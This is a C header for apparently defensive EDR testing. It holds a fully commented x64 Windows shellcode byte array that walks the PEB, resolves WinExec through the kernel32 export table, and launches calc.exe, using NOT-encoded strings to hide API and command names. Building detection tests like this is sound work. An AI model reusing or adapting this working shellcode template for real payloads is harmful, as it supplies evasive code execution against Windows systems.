/*
 * calc_shellcode.h
 * x64 position-independent shellcode: WinExec("calc.exe") via PEB walk
 *
 * Source: boku7 — x64 Windows 10 Dynamic & Null-Free WinExec PopCalc
 *         https://www.exploit-db.com/shellcodes/49819
 *         https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode
 *
 * Technique:
 *   1. Walk PEB → InMemoryOrderModuleList to find kernel32.dll base
 *   2. Parse export table, compare function name hashes to find WinExec
 *   3. Call WinExec("calc.exe", SW_SHOW)
 *
 * 205 bytes, null-free, tested on Windows 10/11 and Server 2019/2022.
 *
 * This shellcode contains patterns that will trigger YARA rules in
 * xll_shellcode.yar (PEB walk, export table parsing, API hashing).
 *
 * For AkesoEDR P10-T1 integration testing only.
 */

#ifndef CALC_SHELLCODE_H
#define CALC_SHELLCODE_H

static const unsigned char calc_shellcode[] = {
    0x48, 0x31, 0xff,                   /* xor rdi, rdi                     */
    0x48, 0xf7, 0xe7,                   /* mul rdi (rax=rdx=0)              */
    0x65, 0x48, 0x8b, 0x58, 0x60,       /* mov rbx, gs:[rax+60h] (PEB)     */
    0x48, 0x8b, 0x5b, 0x18,             /* mov rbx, [rbx+18h] (Ldr)        */
    0x48, 0x8b, 0x5b, 0x20,             /* mov rbx, [rbx+20h] (InMemOrder) */
    0x48, 0x8b, 0x1b,                   /* mov rbx, [rbx] (1st entry)      */
    0x48, 0x8b, 0x1b,                   /* mov rbx, [rbx] (2nd — kernel32) */
    0x48, 0x8b, 0x5b, 0x20,             /* mov rbx, [rbx+20h] (DllBase)    */
    0x49, 0x89, 0xd8,                   /* mov r8, rbx (kernel32 base)     */
    0x8b, 0x5b, 0x3c,                   /* mov ebx, [rbx+3Ch] (e_lfanew)   */
    0x4c, 0x01, 0xc3,                   /* add rbx, r8                      */
    0x48, 0x31, 0xc9,                   /* xor rcx, rcx                     */
    0x66, 0x81, 0xc1, 0xff, 0x88,       /* add cx, 88FFh                    */
    0x48, 0xc1, 0xe9, 0x08,             /* shr rcx, 8 (rcx=88h ExportDir)  */
    0x8b, 0x14, 0x0b,                   /* mov edx, [rbx+rcx] (ExportRVA)  */
    0x4c, 0x01, 0xc2,                   /* add rdx, r8                      */
    0x4d, 0x31, 0xd2,                   /* xor r10, r10                     */
    0x44, 0x8b, 0x52, 0x1c,             /* mov r10d, [rdx+1Ch] (AddrFuncs) */
    0x4d, 0x01, 0xc2,                   /* add r10, r8                      */
    0x4d, 0x31, 0xdb,                   /* xor r11, r11                     */
    0x44, 0x8b, 0x5a, 0x20,             /* mov r11d, [rdx+20h] (AddrNames) */
    0x4d, 0x01, 0xc3,                   /* add r11, r8                      */
    0x4d, 0x31, 0xe4,                   /* xor r12, r12                     */
    0x44, 0x8b, 0x62, 0x24,             /* mov r12d, [rdx+24h] (AddrOrds)  */
    0x4d, 0x01, 0xc4,                   /* add r12, r8                      */
    /* --- find WinExec by name comparison --- */
    0xeb, 0x32,                         /* jmp short get_WinExec_str        */
    /* compare_func: */
    0x5b,                               /* pop rbx (ptr to "WinExec\0")    */
    0x59,                               /* pop rcx (counter)                */
    /* search_loop: */
    0x48, 0x31, 0xc0,                   /* xor rax, rax                     */
    0x48, 0x89, 0xe2,                   /* mov rdx, rsp                     */
    0x51,                               /* push rcx                         */
    0x48, 0x8b, 0x0c, 0x24,             /* mov rcx, [rsp]                   */
    0x48, 0x31, 0xff,                   /* xor rdi, rdi                     */
    0x41, 0x8b, 0x3c, 0x83,             /* mov edi, [r11+rax*4] (NameRVA)  */
    0x4c, 0x01, 0xc7,                   /* add rdi, r8                      */
    0x48, 0x89, 0xd6,                   /* mov rsi, rdx                     */
    0xf3, 0xa6,                         /* repe cmpsb                       */
    0x74, 0x05,                         /* je found                         */
    0x48, 0xff, 0xc0,                   /* inc rax                          */
    0xeb, 0xe6,                         /* jmp search_loop                  */
    /* found: */
    0x59,                               /* pop rcx                          */
    0x66, 0x41, 0x8b, 0x04, 0x44,       /* mov ax, [r12+rax*2] (ordinal)   */
    0x41, 0x8b, 0x04, 0x82,             /* mov eax, [r10+rax*4] (funcRVA)  */
    0x4c, 0x01, 0xc0,                   /* add rax, r8 (WinExec addr)      */
    0x53,                               /* push rbx                         */
    0xc3,                               /* ret (jump to WinExec resolver)   */
    /* get_WinExec_str: */
    0x48, 0x31, 0xc9,                   /* xor rcx, rcx                     */
    0x80, 0xc1, 0x07,                   /* add cl, 7 (len "WinExec")       */
    /* NOT-encoded "WinExec\0" pushed via mov + not */
    0x48, 0xb8,
        0x0f, 0xa8, 0x96, 0x91,
        0xba, 0x87, 0x9a, 0x9c,         /* mov rax, ~"WinExec\0" (encoded) */
    0x48, 0xf7, 0xd0,                   /* not rax (decode)                 */
    0x48, 0xc1, 0xe8, 0x08,             /* shr rax, 8 (align)              */
    0x50,                               /* push rax ("WinExec\0" on stack) */
    0x51,                               /* push rcx (counter=7)            */
    0xe8, 0xb0, 0xff, 0xff, 0xff,       /* call compare_func               */
    /* --- WinExec resolved, now call it --- */
    0x49, 0x89, 0xc6,                   /* mov r14, rax (save WinExec ptr) */
    0x48, 0x31, 0xc9,                   /* xor rcx, rcx                     */
    0x48, 0xf7, 0xe1,                   /* mul rcx (rax=rdx=0)              */
    0x50,                               /* push rax (null terminator)       */
    /* NOT-encoded "calc.exe" pushed via mov + not */
    0x48, 0xb8,
        0x9c, 0x9e, 0x93, 0x9c,
        0xd1, 0x9a, 0x87, 0x9a,         /* mov rax, ~"calc.exe" (encoded)  */
    0x48, 0xf7, 0xd0,                   /* not rax (decode to "calc.exe")  */
    0x50,                               /* push rax                         */
    0x48, 0x89, 0xe1,                   /* mov rcx, rsp ("calc.exe" ptr)   */
    0x48, 0xff, 0xc2,                   /* inc rdx (rdx=1, SW_SHOWNORMAL)  */
    0x48, 0x83, 0xec, 0x20,             /* sub rsp, 20h (shadow space)     */
    0x41, 0xff, 0xd6,                   /* call r14 (WinExec)              */
};

#define CALC_SHELLCODE_SIZE sizeof(calc_shellcode)

#endif /* CALC_SHELLCODE_H */
